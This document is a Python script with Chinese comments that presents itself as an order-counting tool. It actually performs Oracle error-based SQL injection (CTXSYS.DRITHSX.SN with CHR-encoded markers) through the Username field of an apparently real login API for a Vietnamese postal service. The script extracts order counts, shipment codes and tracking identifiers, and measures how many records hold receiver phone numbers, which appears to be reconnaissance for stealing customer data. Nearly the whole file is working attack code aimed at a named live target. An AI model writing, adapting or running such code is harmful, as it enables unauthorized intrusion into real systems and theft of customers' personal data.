#!/usr/bin/env python3
"""
统计当天去重后的真实订单数量
"""

import requests
import json
import time

class UniqueOrderCounter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def count_unique_orders(self):
        """统计各表去重后的订单数"""
        print("=" * 80)
        print("📊 各表去重后的订单统计（2025-10-10）")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            # E1E2_PH表
            ("E1E2_PH - 总记录数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("E1E2_PH - 不同MABC数（去重）", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            # SHIPMENT表
            ("SHIPMENT - 总记录数", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("SHIPMENT - 不同CODE数（去重）", 
             f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            # E1E2_PH_TEMP_DATA2_LOG表
            ("TEMP_DATA2_LOG - 总记录数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"),
            
            ("TEMP_DATA2_LOG - 不同MABC数（去重）", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"),
        ]
        
        results = {}
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result:>10}")
                results[name] = int(result) if result.isdigit() else result
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1.5)
        
        return results
    
    def check_mabc_overlap(self):
        """检查不同表之间的MABC重叠情况"""
        print("\n" + "=" * 80)
        print("🔍 检查各表MABC的重叠情况")
        print("=" * 80)
        
        date = '20251010'
        
        # 随机抽取几个MABC检查
        print("\n🔎 随机抽样检查MABC在各表的分布:")
        
        # 从E1E2_PH获取5个MABC
        for i in range(1, 6):
            query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}') WHERE RN={i}"
            mabc = self.extract_via_error(query_mabc)
            
            if mabc:
                print(f"\n  MABC={mabc}:")
                
                # 检查在SHIPMENT表
                query1 = f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CODE LIKE '%{mabc}%' AND CREATE_DATE='{date}'"
                count1 = self.extract_via_error(query1)
                if count1 and int(count1) > 0:
                    print(f"    ✅ SHIPMENT表: 存在")
                else:
                    print(f"    ❌ SHIPMENT表: 不存在")
                
                # 检查在TEMP_DATA2_LOG表
                query2 = f"SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}'"
                count2 = self.extract_via_error(query2)
                if count2 and int(count2) > 0:
                    print(f"    ✅ TEMP_LOG表: 存在 ({count2}条)")
                else:
                    print(f"    ❌ TEMP_LOG表: 不存在")
                
                time.sleep(2)
    
    def analyze_shipment_codes(self):
        """分析SHIPMENT表的CODE格式"""
        print("\n" + "=" * 80)
        print("🔍 SHIPMENT表CODE格式分析")
        print("=" * 80)
        
        date = '20251010'
        
        # 查看SHIPMENT表的样本CODE
        print("\n🔎 SHIPMENT表前5条订单的CODE:")
        for i in range(1, 6):
            query = f"SELECT CODE FROM (SELECT CODE, ROWNUM AS RN FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}') WHERE RN={i}"
            code = self.extract_via_error(query)
            if code:
                print(f"  {i}. {code}")
                
                # 检查CODE长度
                query_len = f"SELECT LENGTH(CODE) FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                length = self.extract_via_error(query_len)
                if length:
                    print(f"     长度: {length} 字符")
            
            time.sleep(1.5)
    
    def estimate_total_unique(self):
        """估算总的唯一订单数"""
        print("\n" + "=" * 80)
        print("🎯 估算当天真实订单总数")
        print("=" * 80)
        
        date = '20251010'
        
        # 方法1: 使用SHIPMENT表（最准确）
        print("\n📊 方法1: 基于SHIPMENT表（主订单表）")
        query1 = f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"
        shipment_count = self.extract_via_error(query1)
        if shipment_count:
            print(f"  唯一订单数: {shipment_count}")
        
        time.sleep(1.5)
        
        # 方法2: 合并所有表的MABC
        print("\n📊 方法2: 基于E1E2_PH表的MABC")
        query2 = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
        e1e2_count = self.extract_via_error(query2)
        if e1e2_count:
            print(f"  唯一MABC数: {e1e2_count}")
        
        time.sleep(1.5)
        
        # 方法3: TEMP_DATA2_LOG表
        print("\n📊 方法3: 基于TEMP_DATA2_LOG表")
        query3 = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"
        temp_count = self.extract_via_error(query3)
        if temp_count:
            print(f"  唯一MABC数: {temp_count}")
        
        return {
            'SHIPMENT': int(shipment_count) if shipment_count and shipment_count.isdigit() else 0,
            'E1E2_PH': int(e1e2_count) if e1e2_count and e1e2_count.isdigit() else 0,
            'TEMP_LOG': int(temp_count) if temp_count and temp_count.isdigit() else 0
        }
    
    def check_phone_coverage_unique(self):
        """检查去重后有电话的订单占比"""
        print("\n" + "=" * 80)
        print("📞 去重后的电话覆盖率")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            # E1E2_PH表（去重）
            ("E1E2_PH - 总MABC", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("E1E2_PH - 有电话的MABC", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            
            # SHIPMENT表
            ("SHIPMENT - 总订单", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("SHIPMENT - 有电话的订单", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_PHONE IS NOT NULL"),
        ]
        
        results = {}
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
                results[name] = int(result) if result.isdigit() else result
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1.5)
        
        return results
    
    def run_all_counts(self):
        """运行所有统计"""
        print("=" * 80)
        print("🔢 当天订单去重统计工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行统计
        print("\n" + "=" * 80)
        print("第1步: 统计各表记录数")
        print("=" * 80)
        table_stats = self.count_unique_orders()
        
        print("\n" + "=" * 80)
        print("第2步: 估算真实订单总数")
        print("=" * 80)
        unique_counts = self.estimate_total_unique()
        
        print("\n" + "=" * 80)
        print("第3步: 电话覆盖率统计")
        print("=" * 80)
        phone_stats = self.check_phone_coverage_unique()
        
        print("\n" + "=" * 80)
        print("第4步: 检查表间重叠")
        print("=" * 80)
        self.check_mabc_overlap()
        
        print("\n" + "=" * 80)
        print("第5步: SHIPMENT表分析")
        print("=" * 80)
        self.analyze_shipment_codes()
        
        # 最终总结
        print("\n" + "=" * 80)
        print("📊 最终统计结果")
        print("=" * 80)
        
        print("\n各表去重后的订单数:")
        for table, count in unique_counts.items():
            if count > 0:
                print(f"  • {table:15} : {count:>6,} 个唯一订单")
        
        # 电话覆盖率
        e1e2_total = phone_stats.get("E1E2_PH - 总MABC", 0)
        e1e2_phone = phone_stats.get("E1E2_PH - 有电话的MABC", 0)
        ship_total = phone_stats.get("SHIPMENT - 总订单", 0)
        ship_phone = phone_stats.get("SHIPMENT - 有电话的订单", 0)
        
        print("\n电话覆盖率（去重后）:")
        if e1e2_total > 0:
            print(f"  • E1E2_PH表    : {e1e2_phone}/{e1e2_total} = {e1e2_phone/e1e2_total*100:.1f}%")
        if ship_total > 0:
            print(f"  • SHIPMENT表   : {ship_phone}/{ship_total} = {ship_phone/ship_total*100:.1f}%")
        
        # 推荐使用哪个表
        print("\n💡 推荐:")
        max_count = max(unique_counts.values())
        recommended_table = [k for k, v in unique_counts.items() if v == max_count][0]
        print(f"  建议使用 {recommended_table} 表")
        print(f"  该表包含 {max_count:,} 个唯一订单")
        
        print("\n" + "=" * 80)
        print("🎉 统计完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    counter = UniqueOrderCounter(target_url)
    counter.run_all_counts()
